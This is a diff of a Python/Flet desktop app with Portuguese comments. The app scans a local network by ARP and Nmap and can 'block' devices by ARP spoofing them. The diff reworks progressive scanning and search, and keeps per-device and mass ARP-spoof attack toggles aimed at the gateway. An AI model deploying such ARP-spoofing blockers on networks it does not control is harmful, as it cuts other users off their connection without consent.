+            self.scan_status.value = "Pronto"
+            self.scan_progress.value = 0
             self.page.update()
         else:
-            # Parar scan
+            # Parar
             self.stop_scan_requested = True
 
     async def run_scan_task(self):
-        """Executa o processo de escaneamento e atualiza a UI."""
+        """
+        Novo fluxo progressivo:
+        - Adiciona gateway e local imediatamente
+        - Varre ARP em lotes (atualizando a cada lote)
+        - Complementa via Nmap em streaming (se disponível)
+        """
         try:
-            network_cidr = f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"
-            scanned_devices = await asyncio.to_thread(scan_network, network_cidr)
+            # Limpa estado de lista
+            self.all_devices.clear()
+            self.device_index.clear()
+            self.devices_list_view.controls.clear()
+            self.page.update()
 
-            if not self.stop_scan_requested:
-                if not any(d['ip'] == self.gateway_ip for d in scanned_devices):
-                    scanned_devices.append({'ip': self.gateway_ip, 'mac': get_mac(self.gateway_ip) or '??:??:??:??:??:??', 'status': 'Conectado'})
-                if not any(d['ip'] == self.local_ip for d in scanned_devices):
-                    scanned_devices.append({'ip': self.local_ip, 'mac': get_mac(self.local_ip) or '??:??:??:??:??:??', 'status': 'Conectado'})
+            # Determina rede alvo
+            if CURRENT_SUBNET is not None:
+                network_cidr = str(CURRENT_SUBNET)
+            else:
+                network_cidr = f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"
 
-                self.all_devices = []
-                for d in scanned_devices:
-                    if d['ip'] == self.gateway_ip:
-                        d['status'] = 'Gateway Padrão'
-                    elif d['ip'] == self.local_ip:
-                        d['status'] = 'Este Dispositivo'
-                    elif self.attacking.get(d['ip']):
-                        d['status'] = 'Bloqueado'
-                    else:
-                        d['status'] = 'Conectado'
-                    self.all_devices.append(d)
+            # Adiciona gateway/local cedo
+            for special_ip in [self.gateway_ip, self.local_ip]:
+                if special_ip:
+                    mac = await asyncio.to_thread(get_mac, special_ip)
+                    self.add_or_update_device(special_ip, mac=mac)
 
-                self.filter_devices(None)
+            # Gera hosts e remove gateway/local
+            try:
+                net = ipaddress.ip_network(network_cidr, strict=False)
+                hosts = [str(h) for h in net.hosts()]
+            except Exception:
+                # fallback /24
+                base = f"{'.'.join(self.gateway_ip.split('.')[:-1])}.0/24"
+                net = ipaddress.ip_network(base, strict=False)
+                hosts = [str(h) for h in net.hosts()]
+
+            hosts = [h for h in hosts if h not in (self.local_ip, self.gateway_ip)]
+            total = len(hosts)
+            processed = 0
+
+            # Configurações de desempenho
+            CHUNK_SIZE = 32          # tamanho do lote ARP
+            ARP_TIMEOUT = 1.5        # timeout por lote (definido no _arp_chunk_scan)
+
+            self.scan_progress.value = 0
+            self.page.update()
+
+            # Varredura ARP em lotes (progressiva)
+            for i in range(0, total, CHUNK_SIZE):
+                if self.stop_scan_requested:
+                    return
+                chunk = hosts[i:i + CHUNK_SIZE]
+
+                results = await asyncio.to_thread(self._arp_chunk_scan, chunk)
+                processed += len(chunk)
+
+                # Enriquecimento rápido por dispositivo encontrado
+                for ip, mac in results:
+                    if self.stop_scan_requested:
+                        return
+                    # hostname pode bloquear; faz em thread
+                    hostname = await asyncio.to_thread(get_hostname, ip)
+                    self.add_or_update_device(ip, mac=mac, hostname=hostname)
+
+                # Atualiza status/progresso por lote
+                self.scan_status.value = f"Escaneando… {len(self.all_devices)} dispositivos • {processed}/{total} IPs varridos"
+                self.scan_progress.value = processed / total if total else 0
+                self.page.update()
+
+            # Complemento via Nmap (streaming) — também progressivo
+            if NMAP_BIN and not self.stop_scan_requested:
+                await self._nmap_stream_supplement(network_cidr)
+
         finally:
-            # Não alteramos o botão aqui; o toggle_scan lida com isso.
             self.page.update()
 
     def filter_devices(self, e):
-        """Filtra a lista de dispositivos com base no campo de busca."""
-        search_term = self.search_field.value.lower() if self.search_field.value else ""
-        if not search_term:
+        term = (self.search_field.value or "").lower()
+        if not term:
             self.update_device_list(self.all_devices)
             return
-
-        filtered_devices = []
-        for device in self.all_devices:
-            if search_term in device['ip'].lower() or \
-               search_term in device['mac'].lower():
-                filtered_devices.append(device)
-        self.update_device_list(filtered_devices)
+        filtered = []
+        for d in self.all_devices:
+            if (
+                term in d['ip'].lower() or
+                term in (d['mac'] or '').lower() or
+                term in (d.get('hostname') or '').lower() or
+                term in (d.get('vendor') or '').lower()
+            ):
+                filtered.append(d)
+        self.update_device_list(filtered)
 
     def toggle_device_attack(self, device):
-        """Inicia ou para o ataque a um dispositivo."""
+        # Mantém exatamente o comportamento do seu modelo (executa ARP spoof/restore)
         ip_to_toggle = device['ip']
         is_currently_attacking = self.attacking.get(ip_to_toggle, False)
 
@@ -424,26 +844,49 @@ class NetworkControlApp:
             start_attack(ip_to_toggle, self.gateway_ip, self.attacking)
             device['status'] = 'Bloqueado'
 
+        # Reflete imediatamente na lista filtrada
         self.filter_devices(None)
 
     def mass_block(self, e):
-        """Bloqueia todos os dispositivos elegíveis."""
         for device in self.all_devices:
-            if device['status'] == 'Conectado':
+            if device['status'] == 'Conectado' and device['ip'] not in (self.gateway_ip, self.local_ip):
                 self.toggle_device_attack(device)
 
     def mass_unblock(self, e):
-        """Libera todos os dispositivos bloqueados."""
         for device in self.all_devices:
-            if device['status'] == 'Bloqueado':
+            if device['status'] == 'Bloqueado' and device['ip'] not in (self.gateway_ip, self.local_ip):
                 self.toggle_device_attack(device)
 
     async def initial_scan(self):
-        """Realiza um escaneamento inicial ao carregar a aplicação."""
         await self.run_scan_task()
 
+    # ---------------- OUI cache actions ----------------
+    def update_oui_cache(self, e):
+        self.scan_status.value = "Baixando base OUI da IEEE..."
+        self.scan_progress.value = None
+        self.page.update()
+
+        def _task():
+            added = update_vendor_cache_from_ieee()
+            return added
+
+        def _done(fut: asyncio.Future):
+            added = fut.result()
+            self.scan_status.value = f"Base OUI atualizada (+{added} entradas)."
+            self.scan_progress.value = 0
+            self.page.update()
+
+        fut = self.page.run_task(asyncio.to_thread, _task)
+        fut.add_done_callback(_done)
+
+
+
+# =====================================================================
+# Bootstrap Flet
+# =====================================================================
+
 def main(page: ft.Page):
-    app = NetworkControlApp(page)
+    NetworkControlApp(page)
 
 if __name__ == "__main__":
     ft.app(target=main)
